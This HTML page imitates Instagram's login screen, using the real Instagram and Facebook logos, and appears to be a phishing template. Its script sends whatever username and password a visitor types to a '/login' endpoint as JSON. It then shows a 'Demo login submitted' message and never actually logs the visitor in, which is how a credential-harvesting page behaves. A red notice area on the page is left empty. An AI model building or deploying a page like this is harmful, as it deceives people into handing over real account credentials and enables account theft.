<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram Clone</title>
  <style>
    body {
      background-color: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      width: 350px;
      padding: 40px 40px 20px;
      text-align: center;
    }

    .logo-text {
      font-family: 'Pacifico', cursive;
      font-size: 42px;
      margin-bottom: 30px;
      color: #262626;
    }

    .logo img {
      width: 180px;
      margin-bottom: 30px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-bottom: 8px;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      background-color: #fafafa;
      font-size: 14px;
    }

    button.login-btn {
      width: 100%;
      padding: 8px;
      background-color: #3897f0;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-top: 8px;
      cursor: pointer;
    }

    .separator {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .separator div {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-size: 12px;
      font-weight: 600;
    }

    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #385185;
      font-weight: 500;
      font-size: 14px;
      margin: 15px 0;
      text-decoration: none;
    }

    .facebook-login img {
      width: 16px;
      margin-right: 8px;
    }

    .forgot {
      font-size: 12px;
      margin-top: 12px;
    }

    .forgot a {
      color: #00376b;
      text-decoration: none;
    }

    .forgot a:hover {
      text-decoration: underline;
    }

    .note {
      font-size: 11px;
      color: red;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" />
     <div class="logo-text">Instagram
    </div>
   

    <form id="loginForm">
      <input type="text" name="username" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit" class="login-btn">Log in</button>
    </form>

    <div class="separator">
      <div></div>
      <span>OR</span>
      <div></div>
    </div>

    <a href="#" class="facebook-login">
      <img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" alt="Facebook Logo">
      Log in with Facebook
    </a>

    <div class="note">
    </div>
  </div>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const username = this.username.value;
      const password = this.password.value;

      await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });

      alert("Demo login submitted. Thank you!");
      this.reset();
    });
  </script>
</body>
</html>
